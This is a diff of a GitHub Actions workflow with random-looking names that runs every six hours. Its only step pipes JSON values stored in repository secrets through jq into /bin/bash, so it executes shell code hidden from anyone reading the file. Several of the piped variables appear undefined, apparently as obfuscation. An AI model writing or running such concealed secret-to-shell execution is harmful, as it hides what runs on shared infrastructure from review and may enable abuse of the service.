@@ -1,29 +1,24 @@
 name: baiheizi7182
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 3/6 * * *'
+    - cron: '12 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: baiheizi7182
         env:
-          nwb8651: ${{ secrets.nwb8651 }}
+          ujc63: ${{ secrets.ujc63 }}
         run: |
-          echo $nwb8651 | jq -r .kqmub0723 | /bin/bash
-          echo $npmx38 | jq -r .fl7519 | /bin/bash
-          echo $kqk6 | jq -r .v7912 | /bin/bash
-          echo $los812 | jq -r .lsmx4554 | /bin/bash
-          echo $yayls71969 | jq -r .kgk25 | /bin/bash
-          echo $iak227 | jq -r .tgq75 | /bin/bash
-          echo $kcbef0141 | jq -r .sdwxe7 | /bin/bash
-          echo $ejiqz09385 | jq -r .ye96 | /bin/bash
-          echo $eveo4 | jq -r .pswki800 | /bin/bash
-          echo $hscp04055 | jq -r .h6 | /bin/bash
-          echo $q6 | jq -r .pq28 | /bin/bash
-          echo $mciiq4470 | jq -r .i07825 | /bin/bash
+          echo $ujc63 | jq -r .h7853 | /bin/bash
+          echo $buc712 | jq -r .dvvdb1577 | /bin/bash
+          echo $szdys4 | jq -r .zjttw7 | /bin/bash
+          echo $kek62672 | jq -r .fp1 | /bin/bash
+          echo $ei77 | jq -r .r8 | /bin/bash
+          echo $hl48258 | jq -r .w42 | /bin/bash
+          echo $mh1868 | jq -r .nnkl08 | /bin/bash
 
